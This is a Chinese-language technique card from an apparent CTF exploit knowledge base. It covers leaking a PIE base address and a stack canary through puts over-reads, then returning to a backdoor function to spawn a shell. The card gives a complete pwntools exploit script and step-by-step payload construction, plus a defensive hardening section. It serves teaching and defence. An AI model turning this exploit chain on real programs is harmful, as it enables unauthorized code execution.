---
id: binary-pwn-stack-pie-base-leak-csu-init-return-address
title: PIE 基址泄露：puts 越界打印栈上 __libc_csu_init 返回地址并读 6 字节还原 elf.address
type: scenario
domain: binary
path: binary/pwn/stack
technique: pie-base-leak-csu-init-return-address-puts
aliases:
- PIE 基址泄露
- __libc_csu_init 泄露
- puts 泄露返回地址
- 栈上返回地址泄 PIE
- ret2text 全保护
- elf.address 计算
tags:
- pwn
- stack
- pie
- aslr
- canary
- ret2text
- puts-leak
- ctf
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V288
  verified_at: '2026-11-08T04:54:25+08:00'
  notes: 已对照原文全文与图01-09核对：checksec全保护(图01)、IDA栈布局buf/canary 0x108/返回地址(图02)、canary在高位(图03/04)、0x108填充末字节0x0a(图05)、__libc_csu_init距buf 0xf0(图06)、vmmap偏移0x12c0(图07)、backdoor+5跳push rbp(图08)、getshell及id回显(图09)，EXP各段与原文一致。PIE泄露原子成卡粒度合适；canary低字节与ret2text对齐按merge跳过。dedup仅与canary泄露卡related，非同一链；dup-scan无本篇pair。未复跑EXP；偏移依赖例题二进制已注明需重算；原文无产品/glibc版本，未设affected_versions；无sources/source_url。
---

## 一句话结论

开启 PIE 后二进制基址随机，但栈上保存的返回地址仍指向二进制内的固定偏移；当程序在栈溢出后对同一缓冲区调用 `puts(buf)` 时，用 `0xf0` 字节填充让输出越过缓冲区继续打印栈上的 `__libc_csu_init` 返回地址，读取 6 字节（高 2 字节必为 `0x0000`/符号扩展）并减去该版本二进制的固定偏移（本例 `0x12c0`），即可得到程序基址并设置 `elf.address`，之后 `elf.symbols['backdoor']` 等符号地址全部可用。

## 原理

- **PIE 只随机化基址，不改变内部偏移**：PIE 让代码段/数据段整体随机映射，但 `backdoor`、`__libc_csu_init`、PLT/GOT 相对基址的偏移在编译后固定；泄露任意一个指向二进制的运行时地址，减去其静态偏移即得基址。
- **栈上天然存在返回地址**：`main` 调用其他函数（或 `__libc_start_main` 调用 `main`）时会把返回地址压栈；这些地址指向二进制代码段，正好携带 PIE 基址信息。
- **puts 越界读**：程序把 `read(0, buf, 0x200)` 读入的缓冲区直接 `puts(buf)`，未按实际长度输出，而是按 C 字符串扫描到 NUL。若发送 `0xf0` 字节 `'a'`，缓冲区被填满但没有覆盖栈上更高的 `__libc_csu_init` 返回地址；`puts` 会继续打印该地址的 6 个有效字节，直到遇到高位的 `\x00` 停止。
- **为什么读 6 字节**：x86-64 规范要求用户态地址高 16 位为 0（或内核地址符号扩展为 `0xffff`），有效地址只有低 48 位；读 8 字节会把地址后面的栈数据也读进来，导致 `u64` 结果错误。读 6 字节后 `ljust(8, b'\x00')` 补齐到 8 字节再 `u64` 解包。
- **与 canary 泄露配合**：全保护程序通常还要泄露 canary。本例用 `0x109` 字节覆盖 canary 最低字节 `0x00` 后，`puts` 带出剩余 7 字节，`u64(recv(7).ljust(8, b'\x00')) << 8` 还原 canary；两次泄露都来自同一个 `puts(buf)` 越界输出。
- **栈对齐修正**：跳转 `backdoor` 时若 `system` 内 `movaps` 因 RSP 未 16 字节对齐崩溃，可跳到 `backdoor+5` 跳过 `push rbp`，使调用 `system` 时 RSP 末位为 0；具体 +N 需按反汇编序言确认（`endbr64` 开头时不能机械套用）。

## 触发条件

- 目标为 PIE 编译的 64 位 ELF，存在可覆盖到栈上返回地址附近的栈溢出；
- 程序在函数返回/canary 校验前对同一缓冲区调用 `puts`/`printf("%s")` 等字符串输出（非定长 write）；
- 已知该二进制中返回地址对应符号（本例 `__libc_csu_init`）的静态偏移，或能通过附件/libc 版本确定；
- 存在第二次输入路径，用于提交带正确 canary 的返回地址覆盖 payload；
- 若开启 canary，需先通过低字节 NUL 覆盖法泄露 canary。

## 利用步骤

1. `checksec` 确认 PIE/Canary/NX；IDA 反编译确认 `buf` 到保存 rbp/返回地址的偏移（本例 `buf` 距 canary `0x108`，距 `__libc_csu_init` 返回地址 `0xf0`）。
2. 发送 `0xf0` 字节 `'a'`，`recvuntil(b'a'*0xf0)`，再 `recv(6)` 得到返回地址低 6 字节；`u64(leak.ljust(8, b'\x00'))` 还原完整地址。
3. 减去 `__libc_csu_init` 的静态偏移（本例 `0x12c0`）得到 `elf.address`；`elf.address = base` 后即可取 `elf.symbols['backdoor']`。
4. 另发 `0x109` 字节覆盖 canary 最低字节，`recvuntil(b'a'*0x109)` 后 `recv(7)`，`u64(...ljust(8, b'\x00')) << 8` 得到 canary。
5. 构造 `payload = b'exit'.ljust(0x108, b'\x00') + p64(canary) + b'0'*8 + p64(backdoor+5)`：`exit` 先结束循环，随后填充、回填 canary、覆盖 rbp 与返回地址。
6. 发送 payload，`backdoor+5` 跳过 `push rbp` 满足栈对齐，`system("/bin/sh")` 执行。

## PoC

原文 EXP 核心片段（偏移需按目标二进制重算，未在本机复跑）：

```python
from pwn import *

elf_path = './test'
elf = ELF(elf_path)
context(arch=elf.arch, os=elf.os, log_level="info")
io = process([elf_path])

# 1) 泄露 PIE 基址：puts 越过 0xf0 字节填充打印 __libc_csu_init 返回地址
io.sendafter(b'please input:\n', b'a'*0xf0)
io.recvuntil(b'a'*0xf0)
__libc_csu_init = u64(io.recv(6).ljust(8, b'\x00'))
elf.address = __libc_csu_init - 0x12c0
log.info('elf base address: ' + hex(elf.address))

backdoor_address = elf.symbols['backdoor']

# 2) 泄露 canary：覆盖最低字节 0x00 后读取剩余 7 字节，左移 8 位还原
io.sendafter(b'please input:\n', b'a'*0x109)
io.recvuntil(b'a'*0x109)
canary = u64(io.recv(7).ljust(8, b'\x00')) << 8

# 3) 覆盖返回地址到 backdoor+5（跳 push rbp 做 16 字节栈对齐）
payload = b'exit'.ljust(0x108, b'\x00') + p64(canary) + b'0'*8 + p64(backdoor_address + 5)
io.sendafter(b'please input:\n', payload)
io.interactive()
```

## 变体与关联

- **变体**：泄露对象可换成 `main` 的返回地址、`__libc_start_main` 调用点、PLT 桩地址或栈上其他代码指针；偏移按 `nm`/IDA 计算。
- **变体**：若输出用 `printf("%s")`/`strlen` 同理；若只能输出固定长度，可改用格式化字符串 `%p` 或部分覆写返回地址低字节。
- **变体**：读 6 字节是 x86-64 用户地址的通用做法；若目标为 32 位则读 4 字节。
- **关联**：[[binary-pwn-stack-canary-lowbyte-nul-overwrite-string-leak]]（本例的 canary 泄露原子，含左移还原与概率分析）、[[binary-pwn-stack-ret2text-win-plus-one-align]]（ret2text 后门跳转与 win+1 栈对齐，本例用 backdoor+5 跳过 push rbp）、[[binary-pwn-format-string-canary-libc-leak-rop-system]]（格式化字符串同时泄 canary/libc 的替代路线）、[[binary-pwn-rop-ret2csu-bss-binsh-libc-offset-mismatch]]（泄露后继续 ROP 的进阶用法）。

## 检测与防御

- **编译加固**：开启 PIE + Full RELRO + stack canary，并对所有用户缓冲区按实际长度输出（`write(1, buf, n)`），禁止 `puts`/`printf("%s")` 直接打印未终止缓冲区；使用 `-D_FORTIFY_SOURCE=2`、`-fstack-protector-all`。
- **代码审计**：搜索 `read` 后紧跟 `puts(buf)`/`printf("%s", buf)` 的模式，尤其是循环菜单中同一缓冲区反复读写；确认 `read` 长度大于缓冲区时是否存在越界输出。
- **利用面收敛**：对 `read` 长度做严格上界校验；将敏感返回地址/指针与用户缓冲区隔离；开启 CET/Shadow Stack 可进一步阻止返回地址覆盖。
- **检测/分析**：CTF 中通过 `checksec` 与栈布局确认偏移；真实程序中监控异常 `read` 长度、`puts` 输出长度远超缓冲区、以及随后进程崩溃/控制流异常。
